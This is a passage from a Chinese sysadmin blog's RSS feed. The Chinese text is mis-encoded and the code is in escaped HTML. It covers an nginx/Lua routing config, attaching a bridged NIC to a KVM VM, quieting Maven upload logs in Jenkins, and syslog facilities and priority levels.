&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        ngx.var.upstream = route
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        routes[ngx.var.http_host] = route
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        _G.routes = routes
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      else
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;        ngx.exit(ngx.HTTP_NOT_FOUND)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;      end
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;s1&#34;&gt;    &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_buffering             off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header            Host &lt;span class=&#34;nv&#34;&gt;$host&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_set_header            X-Forwarded-For &lt;span class=&#34;nv&#34;&gt;$proxy_add_x_forwarded_for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_redirect              off&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_connect_timeout       10&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_send_timeout          30&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_read_timeout          30&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    proxy_pass                  http://&lt;span class=&#34;nv&#34;&gt;$upstream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é€è¿›redisä¸€äº›æ•°æ®&lt;/p&gt;</description>
    </item>
    <item>
      <title>kvmçš„è™šæœºä¸­å¦‚ä½•åœ¨çº¿æŒ‚æ¥ä¸€å—æ–°ç½‘å¡</title>
      <link>https://rendoumi.com/posts/20240123-kvm_netcard_attach/</link>
      <pubDate>Tue, 23 Jan 2024 10:11:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-kvm_netcard_attach/</guid>
      <description>&lt;p&gt;æ¯”è¾ƒå¤æ€ªçš„éœ€æ±‚ï¼Œå…¬å¸æ‹‰äº†æ ¹ä¸“çº¿åˆ°æœºæˆ¿ã€‚&lt;/p&gt;
&lt;p&gt;è€Œä½¿ç”¨ä¸“çº¿çš„æœºå™¨æ˜¯ä¸€å°kvmè™šæœºï¼Œå®ä½“æœºæœ‰è‡ªå·±çš„è·¯ç”±ï¼Œå®ä½“æœºçš„å‰ä¸¤ä¸ªç½‘å¡åšäº†åŒç½‘å¡bondingã€‚&lt;/p&gt;
&lt;p&gt;é‚£è™šæœºå°±åªèƒ½ä½¿ç”¨å®æœºçš„ç¬¬ä¸‰å—ç½‘å¡è¿å‡ºå»äº†ï¼Œè€Œä¸”å¿…é¡»åˆ¶å®šhostçš„è·¯ç”±ï¼Œè¿™é‡Œç»™çš„å­ç½‘æ©ç æ˜¯255.255.255.252ï¼Œåªæœ‰2ä¸ªipå¯ä»¥ç”¨ï¼Œæ‰€ä»¥åªèƒ½è™šæœºæœ‰ipï¼Œå®æœºæ ¹æœ¬ä¸èƒ½é…ipåœ°å€ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;é¦–å…ˆæŠŠå®æœºdell r720çš„ç¬¬ä¸‰å—ç½‘å¡em3æ”¹ä¸€ä¸‹ï¼Œè¿æ¥åˆ°ç½‘æ¡¥br1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/sysconfig/network-scripts/ifcfg-em3  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;em3  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;HWADDR&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;XX:XX:XX:XX:XX:XX  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Ethernet  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;UUID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;6b68220d-d5ed-496f-b8d1-4c6d9cbb1234  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;NM_CONTROLLED&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;no  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;BRIDGE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å†åšä¸ªç½‘æ¡¥br1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat /etc/sysconfig/network-scripts/ifcfg-br1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;DEVICE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;br1  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;BOOTPROTO&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;none  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;ONBOOT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;yes  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;TYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;Bridge  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ³¨æ„ï¼Œè¿™ä¸ªç‰©ç†æœºç½‘å¡å’Œç½‘æ¡¥éƒ½æ²¡æœ‰&lt;code&gt;IP&lt;/code&gt;åœ°å€ï¼Œå®åœ¨æ˜¯å¯æ€œï¼Œipä¸å¤Ÿç”¨&lt;/p&gt;
&lt;p&gt;ç„¶åå¯åŠ¨ä»–ä»¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifup em3  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ifup br1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è™šæœºæŒ‚æ¥æ–°è®¾å¤‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;virsh attach-interface --domain vis-16-13-28 &lt;span class=&#34;se&#34;&gt;\ &lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        --type bridge &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;        --source br1 --model virtio &lt;span class=&#34;se&#34;&gt;\
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;        --mac f0:00:ac:30:2d:1d --config
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åsshç™»å½•è™šæœºï¼Œé…ç½®å¥½è™šæœºä¸­eth1çš„ip/maskï¼Œä¸è¦é…gatewayå•Š&lt;/p&gt;
&lt;p&gt;æœ€åç›´æ¥åŠ ä¸»æœºè·¯ç”±ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;route add -host 172.17.11.182 dev eth1  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;pingä¸€ä¸‹å¯¹ç«¯172.17.11.182ï¼Œé€šå°±æå®šäº†ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>mvn buildçš„æ—¶å€™æ§åˆ¶æ—¥å¿—è¾“å‡º</title>
      <link>https://rendoumi.com/posts/20240123-mvn_build_log/</link>
      <pubDate>Tue, 23 Jan 2024 10:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-mvn_build_log/</guid>
      <description>&lt;p&gt;æœ€è¿‘åœ¨å¼„jenkinsçš„è‡ªåŠ¨æ‰“åŒ…éƒ¨ç½²&lt;/p&gt;
&lt;p&gt;å‡ºç°ä¸ªé—®é¢˜ï¼Œé¡¹ç›®æ˜¯ç”¨çš„mvnï¼Œæ‰“åŒ…çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯åœ¨æ§åˆ¶å°ä¸‹è¿˜å¥½ã€‚&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯åœ¨jenkinsä¸‹ï¼Œçœ‹console outputï¼Œå¾€ä¸­å¿ƒä»“åº“artifactoryæäº¤åŒ…çš„æ—¶å€™ï¼Œä¼šæ˜¾ç¤ºä¸‹é¢ä¸€å †ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Uploaded: http://xxx:8081/artifactory/libs-release-local/abc/maven-metadata.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;315&lt;/span&gt; B at 17.1 KB/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Uploading: http://xxx:8081/artifactory/libs-release-local/abc/d/admin-9.1.war  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20000/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20002/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20004/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20006/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20008/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20010/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20012/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20014/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20016/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20018/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20020/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20022/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20024/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20026/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20028/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20030/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20032/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20034/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20036/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20038/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20040/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20042/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;20044/21969 KB  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;......
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;é•¿åº¦æ— æ¯”é•¿ï¼Œåƒåœ¾ä¸œè¥¿ã€‚å¦‚ä½•å°†ä¹‹å±è”½å‘¢ï¼Ÿ&lt;/p&gt;
&lt;p&gt;é¦–å…ˆå»ä¿®æ”¹mvnçš„æ—¥å¿—çº§åˆ«ï¼Œç¼ºçœæ˜¯INFOï¼Œæé«˜åˆ°WARNï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;MAVEN_OPTS&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;-Dorg.slf4j.simpleLogger.defaultLogLevel&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;warn mvn -ff  clean install  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘å»ï¼ŒINFOæ˜¯éƒ½æ²¡äº†ï¼Œä½†æ˜¯è¿™ä¸ªå±…ç„¶è¿˜åœ¨ï¼ï¼ï¼ï¼&lt;/p&gt;
&lt;p&gt;æŸ¥äº†ä¸‹javaçš„æ—¥å¿—ä¼˜å…ˆçº§ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ALL &amp;lt; DEBUG &amp;lt; INFO &amp;lt; WARN &amp;lt; ERROR &amp;lt; FATAL &amp;lt; OFF  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸Šé¢åªæœ‰FATALå’ŒOFFäº†ï¼Œè¯´æ˜è¿™ä¸ªæ˜¯ä¸ªå‰¯äº§å“ï¼Œä¸æ˜¯mvnæ§åˆ¶çš„ï¼Œè€Œæ˜¯ä¸Šä¼ çš„æ—¶å€™äº§ç”Ÿçš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>syslogçº§åˆ«è¯¦è§£</title>
      <link>https://rendoumi.com/posts/20240123-syslog_priority/</link>
      <pubDate>Tue, 23 Jan 2024 09:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240123-syslog_priority/</guid>
      <description>&lt;p&gt;é¦–å…ˆæ˜¯ï¼š&lt;/p&gt;
&lt;p&gt;[facility].[priority]&lt;/p&gt;
&lt;p&gt;facilityè¡¨ç¤ºè®¾å¤‡ã€è®¾æ–½ï¼Œç‰¹åˆ«è£…ç½®ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;auth      &lt;span class=&#34;c1&#34;&gt;# è®¤è¯ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;authpriv  &lt;span class=&#34;c1&#34;&gt;# æƒé™,æˆæƒç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cron      &lt;span class=&#34;c1&#34;&gt;# ä»»åŠ¡è®¡åˆ’ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;daemon    &lt;span class=&#34;c1&#34;&gt;# å®ˆæŠ¤è¿›ç¨‹ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;kern      &lt;span class=&#34;c1&#34;&gt;# å†…æ ¸ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lpr       &lt;span class=&#34;c1&#34;&gt;# æ‰“å°ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mail      &lt;span class=&#34;c1&#34;&gt;# é‚®ä»¶ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mark      &lt;span class=&#34;c1&#34;&gt;# æ ‡è®°ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;news      &lt;span class=&#34;c1&#34;&gt;# æ–°é—»ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;security  &lt;span class=&#34;c1&#34;&gt;# å®‰å…¨ç›¸å…³çš„,ä¸auth ç±»ä¼¼  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;syslog    &lt;span class=&#34;c1&#34;&gt;# syslogè‡ªå·±çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;user      &lt;span class=&#34;c1&#34;&gt;# ç”¨æˆ·ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;uucp      &lt;span class=&#34;c1&#34;&gt;# unix to unix cp ç›¸å…³çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;local0 åˆ° local7 &lt;span class=&#34;c1&#34;&gt;# ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*         &lt;span class=&#34;c1&#34;&gt;# *è¡¨ç¤ºæ‰€æœ‰çš„facility&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¸€å®šè¦æ³¨æ„ä¸Šé¢çš„ï¼Œ&lt;strong&gt;local0 åˆ° local7 # ç”¨æˆ·è‡ªå®šä¹‰ä½¿ç”¨&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;priorityè¡¨ç¤ºä¼˜å…ˆæƒï¼Œæ—¥å¿—ä¼˜å…ˆæƒ(log level),ä¸€èˆ¬æœ‰ä»¥ä¸‹å‡ ç§ä¼˜å…ˆæƒ(ä»ä½åˆ°é«˜)ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;debug           &lt;span class=&#34;c1&#34;&gt;# ç¨‹åºæˆ–ç³»ç»Ÿçš„è°ƒè¯•ä¿¡æ¯  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;info            &lt;span class=&#34;c1&#34;&gt;# ä¸€èˆ¬ä¿¡æ¯,  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;notice          &lt;span class=&#34;c1&#34;&gt;# ä¸å½±å“æ­£å¸¸åŠŸèƒ½,éœ€è¦æ³¨æ„çš„æ¶ˆæ¯  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;warning/warn    &lt;span class=&#34;c1&#34;&gt;# å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½,éœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;err/error       &lt;span class=&#34;c1&#34;&gt;# é”™è¯¯ä¿¡æ¯  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;crit            &lt;span class=&#34;c1&#34;&gt;# æ¯”è¾ƒä¸¥é‡çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;alert           &lt;span class=&#34;c1&#34;&gt;# å¿…é¡»é©¬ä¸Šå¤„ç†çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;emerg/oanic     &lt;span class=&#34;c1&#34;&gt;# ä¼šå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨çš„  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*               &lt;span class=&#34;c1&#34;&gt;# è¡¨ç¤ºæ‰€æœ‰çš„æ—¥å¿—çº§åˆ«&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;none            &lt;span class=&#34;c1&#34;&gt;# è·Ÿ* ç›¸å,è¡¨ç¤ºå•¥ä¹Ÿæ²¡æœ‰  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;syslogçš„æ—¥å¿—ä¼˜å…ˆæƒé»˜è®¤æ˜¯infoï¼Œè¿™æ—¶å€™ç”¨syslogä¸ºdebug(æœ€ä½æ—¥å¿—ä¼˜å…ˆæƒ)æ¥å†™æ—¥å¿—ï¼ŒsyslogæœåŠ¡æ˜¯ä¸ä¼šå†™å…¥æ—¥å¿—çš„ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>Xpathé‡‘æ‰‹æŒ‡</title>
      <link>https://rendoumi.com/posts/20240122-xpath_css_selector/</link>
      <pubDate>Mon, 22 Jan 2024 09:10:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240122-xpath_css_selector/</guid>
      <description>&lt;p&gt;æœ€è¿‘åœ¨æpuppeteerçš„è‡ªåŠ¨åŒ–ï¼Œæœ‰å¾ˆå¤šåœ°æ–¹éœ€è¦ç”¨åˆ°CSS Selectorï¼Œä½†æ˜¯æŸäº›åœ°æ–¹åˆæ˜¯ç”¨Xpathæ–¹ä¾¿ï¼Œé‡‘æ‰‹æŒ‡æ”¾ä¸€ä¸‹ï¼Œå¤‡æŸ¥ï¼š&lt;/p&gt;
